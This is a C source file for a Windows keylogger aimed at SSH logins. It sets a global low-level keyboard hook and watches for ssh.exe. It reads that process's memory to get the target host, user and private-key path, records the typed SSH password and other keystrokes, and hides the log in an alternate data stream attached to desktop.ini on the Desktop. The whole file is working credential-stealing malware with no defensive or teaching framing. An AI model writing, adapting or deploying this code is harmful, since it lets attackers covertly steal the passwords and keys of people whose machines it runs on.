#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <winternl.h>
#include <ShlObj.h>
#include <string.h>
#include <stdlib.h>

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

char ADS_FILE_PATH[MAX_PATH];
char* globalBuffer = NULL;
size_t globalBufferSize = 0;
BOOL shouldLog = FALSE;
int lastPID = 0;
BOOL capturePassword = FALSE;
char passwordBuffer[1024];
size_t passwordBufferIndex = 0;

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

void InitializeADSPath() {
    char userPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, userPath))) {
        sprintf_s(ADS_FILE_PATH, sizeof(ADS_FILE_PATH), "%s\\desktop.ini:log", userPath);
    }
}

#define RED_TEXT "\x1b[31m"
#define RESET_TEXT "\x1b[0m"

#define RED_TEXT "\x1b[31m"
#define RESET_TEXT "\x1b[0m"

void WriteREDToADS(const char* data) {
    if (!data) return;

    char resolvedPath[MAX_PATH];
    if (!ExpandEnvironmentStringsA(ADS_FILE_PATH, resolvedPath, MAX_PATH)) {
        return;
    }

    HANDLE hFile = CreateFileA(
        resolvedPath,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;

        // Write red-colored text
        WriteFile(hFile, RED_TEXT, (DWORD)strlen(RED_TEXT), &bytesWritten, NULL);
        WriteFile(hFile, data, (DWORD)strlen(data), &bytesWritten, NULL);
        WriteFile(hFile, RESET_TEXT, (DWORD)strlen(RESET_TEXT), &bytesWritten, NULL);

        CloseHandle(hFile);
    }
}


void WriteToADS(const char* data) {
    if (!data) return;

    char resolvedPath[MAX_PATH];
    if (!ExpandEnvironmentStringsA(ADS_FILE_PATH, resolvedPath, MAX_PATH)) {
        return;
    }

    HANDLE hFile = CreateFileA(
        resolvedPath,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hFile, data, (DWORD)strlen(data), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

void appendToGlobalBuffer(const char* data) {
    if (!shouldLog || !data) return;

    size_t dataLen = strlen(data);
    if (dataLen == 0) return;

    size_t newSize = globalBufferSize + dataLen + 1;
    char* newBuffer = (char*)realloc(globalBuffer, newSize);
    if (newBuffer) {
        globalBuffer = newBuffer;
        if (globalBufferSize == 0) {
            strcpy_s(globalBuffer, newSize, data);
        }
        else {
            strcat_s(globalBuffer, newSize, data);
        }
        globalBufferSize = newSize;
        WriteToADS(data);
    }
}



int GetCommandLineByPID(DWORD pid) {
    int result = 0;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return -1;

    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        CloseHandle(hProcess);
        return -1;
    }

    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
        CloseHandle(hProcess);
        return -1;
    }

    RTL_USER_PROCESS_PARAMETERS procParams;
    if (!ReadProcessMemory(hProcess, peb.ProcessParameters, &procParams, sizeof(RTL_USER_PROCESS_PARAMETERS), NULL)) {
        CloseHandle(hProcess);
        return -1;
    }

    WCHAR* commandLine = (WCHAR*)malloc(procParams.CommandLine.Length + sizeof(WCHAR));
    if (!commandLine) {
        CloseHandle(hProcess);
        return -1;
    }

    if (!ReadProcessMemory(hProcess, procParams.CommandLine.Buffer, commandLine, procParams.CommandLine.Length, NULL)) {
        free(commandLine);
        CloseHandle(hProcess);
        return -1;
    }
    commandLine[procParams.CommandLine.Length / sizeof(WCHAR)] = L'\0';

    int argc;
    LPWSTR* argv = CommandLineToArgvW(commandLine, &argc);
    if (!argv) {
        free(commandLine);
        CloseHandle(hProcess);
        return -1;
    }

    BOOL hasI = FALSE;
    LPWSTR keyPathW = NULL;
    LPWSTR destinationW = NULL;

    for (int i = 0; i < argc; i++) {
        if (wcscmp(argv[i], L"-i") == 0 && (i + 1 < argc)) {
            hasI = TRUE;
            keyPathW = argv[i + 1];
            result = 1;
            break;
        }
    }

    if (argc > 0) {
        destinationW = argv[argc - 1];
    }

    char destinationA[256] = { 0 };
    char userA[256] = { 0 };
    char hostA[256] = { 0 };
    if (destinationW) {
        WideCharToMultiByte(CP_ACP, 0, destinationW, -1, destinationA, sizeof(destinationA), NULL, NULL);
        char* atPos = strchr(destinationA, '@');
        if (atPos) {
            *atPos = '\0';
            strcpy_s(userA, sizeof(userA), destinationA);
            strcpy_s(hostA, sizeof(hostA), atPos + 1);
        }
        else {
            strcpy_s(hostA, sizeof(hostA), destinationA);
        }
    }

    if (hasI) {
        char keyPathA[MAX_PATH] = { 0 };
        if (keyPathW) {
            WideCharToMultiByte(CP_ACP, 0, keyPathW, -1, keyPathA, sizeof(keyPathA), NULL, NULL);
            char logEntry[MAX_PATH + 256];
            snprintf(logEntry, sizeof(logEntry), "\n============================\n[PrivateKey] IP=%s, User=%s, KeyPath=%s\n============================\n", hostA, userA, keyPathA);
            WriteREDToADS(logEntry);
        }
    }
    else {
        char logEntry[256];
        snprintf(logEntry, sizeof(logEntry), "\n============================\n[Password] IP=%s, User=%s\n", hostA, userA);
        WriteREDToADS(logEntry);
        capturePassword = TRUE;
        passwordBufferIndex = 0;
        memset(passwordBuffer, 0, sizeof(passwordBuffer));
    }

    LocalFree(argv);
    free(commandLine);
    CloseHandle(hProcess);

    return result;
}



DWORD IsProcessRunning(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return procId;
}

void keylogit(int vkCode, BOOL shiftPressed) {
    if (!shouldLog) return;

    char buffer[20] = { 0 };
    BOOL isLetter = TRUE;

    switch (vkCode) {
    case VK_BACK: strcpy_s(buffer, sizeof(buffer), "<BACKSPACE>"); isLetter = FALSE; break;
    case VK_RETURN: strcpy_s(buffer, sizeof(buffer), "\n"); isLetter = FALSE; break;
    case VK_SPACE: strcpy_s(buffer, sizeof(buffer), " "); isLetter = FALSE; break;
    case VK_OEM_PLUS: shiftPressed ? strcpy_s(buffer, "+") : strcpy_s(buffer, "="); isLetter = FALSE; break;
    case VK_OEM_COMMA: shiftPressed ? strcpy_s(buffer, "<") : strcpy_s(buffer, ","); isLetter = FALSE; break;
    case VK_OEM_MINUS: shiftPressed ? strcpy_s(buffer, "_") : strcpy_s(buffer, "-"); isLetter = FALSE; break;
    case VK_OEM_PERIOD: shiftPressed ? strcpy_s(buffer, ">") : strcpy_s(buffer, "."); isLetter = FALSE; break;
    case VK_OEM_1: shiftPressed ? strcpy_s(buffer, ":") : strcpy_s(buffer, ";"); isLetter = FALSE; break;
    case VK_OEM_2: shiftPressed ? strcpy_s(buffer, "?") : strcpy_s(buffer, "/"); isLetter = FALSE; break;
    case VK_OEM_3: shiftPressed ? strcpy_s(buffer, "~") : strcpy_s(buffer, "`"); isLetter = FALSE; break;
    case VK_OEM_4: shiftPressed ? strcpy_s(buffer, "{") : strcpy_s(buffer, "["); isLetter = FALSE; break;
    case VK_OEM_5: shiftPressed ? strcpy_s(buffer, "|") : strcpy_s(buffer, "\\"); isLetter = FALSE; break;
    case VK_OEM_6: shiftPressed ? strcpy_s(buffer, "}") : strcpy_s(buffer, "]"); isLetter = FALSE; break;
    case VK_OEM_7: shiftPressed ? strcpy_s(buffer, "\"") : strcpy_s(buffer, "'"); isLetter = FALSE; break;
    default:
        if (vkCode >= 0x41 && vkCode <= 0x5A) {
            BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            if (capsLock ^ shiftPressed) {
                sprintf_s(buffer, sizeof(buffer), "%c", vkCode);
            }
            else {
                sprintf_s(buffer, sizeof(buffer), "%c", vkCode + 0x20);
            }
        }
        else if (vkCode >= 0x30 && vkCode <= 0x39) {
            if (shiftPressed) {
                const char* shiftNums[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                sprintf_s(buffer, sizeof(buffer), shiftNums[vkCode - 0x30]);
            }
            else {
                sprintf_s(buffer, sizeof(buffer), "%c", vkCode);
            }
        }
        else {
            isLetter = FALSE;
        }
        break;
    }

    if (isLetter && buffer[0] != '\0') {
        appendToGlobalBuffer(buffer);
    }
    else if (!isLetter && buffer[0] != '\0') {
        appendToGlobalBuffer(buffer);
    }
}

int contains_i;

void MonitorProcess() {
    while (1) {
        DWORD pid = IsProcessRunning(L"ssh.exe");
        shouldLog = (pid != 0);
        if (shouldLog) {
            GetCommandLineByPID(pid);
            lastPID = pid;
            return;
        }
        Sleep(2000);
    }
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= HC_ACTION && shouldLog) {
        PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
        int vkCode = kbdStruct->vkCode;
        BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        
        if (wParam == WM_KEYDOWN) {
            DWORD checkPid = IsProcessRunning(L"ssh.exe");
            if (checkPid != lastPID) {
                contains_i = GetCommandLineByPID(checkPid);
                printf("contains_i = %d\n", contains_i);
                lastPID = checkPid;
                if (contains_i == 0) { 
                    capturePassword = TRUE; 
                }
                else {
                    capturePassword = FALSE;
                }
                
                passwordBufferIndex = 0;
            }

            if (capturePassword && contains_i == 0) {
                if (vkCode == VK_RETURN) {
                    if (passwordBufferIndex > 0) {
                        char logEntry[1024];
                        snprintf(logEntry, sizeof(logEntry), "%s\n============================\n", passwordBuffer);
                        WriteREDToADS(logEntry);
                        capturePassword = FALSE;
                        passwordBufferIndex = 0;
                        contains_i = -1;

                    }
                }
                else if (vkCode == VK_BACK) {
                    if (passwordBufferIndex > 0) {
                        passwordBuffer[--passwordBufferIndex] = '\0';
                    }
                }
                else {
                    char buffer[20] = { 0 };
                    BOOL isLetter = TRUE;

                    switch (vkCode) {
                    case VK_SPACE: strcpy_s(buffer, sizeof(buffer), " "); isLetter = FALSE; break;
                    case VK_OEM_PLUS: shiftPressed ? strcpy_s(buffer, "+") : strcpy_s(buffer, "="); isLetter = FALSE; break;
                    case VK_OEM_COMMA: shiftPressed ? strcpy_s(buffer, "<") : strcpy_s(buffer, ","); isLetter = FALSE; break;
                    case VK_OEM_MINUS: shiftPressed ? strcpy_s(buffer, "_") : strcpy_s(buffer, "-"); isLetter = FALSE; break;
                    case VK_OEM_PERIOD: shiftPressed ? strcpy_s(buffer, ">") : strcpy_s(buffer, "."); isLetter = FALSE; break;
                    case VK_OEM_1: shiftPressed ? strcpy_s(buffer, ":") : strcpy_s(buffer, ";"); isLetter = FALSE; break;
                    case VK_OEM_2: shiftPressed ? strcpy_s(buffer, "?") : strcpy_s(buffer, "/"); isLetter = FALSE; break;
                    case VK_OEM_3: shiftPressed ? strcpy_s(buffer, "~") : strcpy_s(buffer, "`"); isLetter = FALSE; break;
                    case VK_OEM_4: shiftPressed ? strcpy_s(buffer, "{") : strcpy_s(buffer, "["); isLetter = FALSE; break;
                    case VK_OEM_5: shiftPressed ? strcpy_s(buffer, "|") : strcpy_s(buffer, "\\"); isLetter = FALSE; break;
                    case VK_OEM_6: shiftPressed ? strcpy_s(buffer, "}") : strcpy_s(buffer, "]"); isLetter = FALSE; break;
                    case VK_OEM_7: shiftPressed ? strcpy_s(buffer, "\"") : strcpy_s(buffer, "'"); isLetter = FALSE; break;
                    default:
                        if (vkCode >= 0x41 && vkCode <= 0x5A) {
                            BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                            if (capsLock ^ shiftPressed) {
                                sprintf_s(buffer, sizeof(buffer), "%c", vkCode);
                            }
                            else {
                                sprintf_s(buffer, sizeof(buffer), "%c", vkCode + 0x20);
                            }
                        }
                        else if (vkCode >= 0x30 && vkCode <= 0x39) {
                            if (shiftPressed) {
                                const char* shiftNums[] = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                                sprintf_s(buffer, sizeof(buffer), shiftNums[vkCode - 0x30]);
                            }
                            else {
                                sprintf_s(buffer, sizeof(buffer), "%c", vkCode);
                            }
                        }
                        else {
                            isLetter = FALSE;
                        }
                        break;
                    }

                    if (isLetter && buffer[0] != '\0' && passwordBufferIndex < sizeof(passwordBuffer) - 1) {
                        passwordBuffer[passwordBufferIndex++] = buffer[0];
                        passwordBuffer[passwordBufferIndex] = '\0';
                    }
                }
            }
            else {
                keylogit(vkCode, shiftPressed);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    InitializeADSPath();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorProcess, NULL, 0, NULL);

    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(NULL), 0);
    if (!kbdHook) {
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kbdHook);
    return 0;
}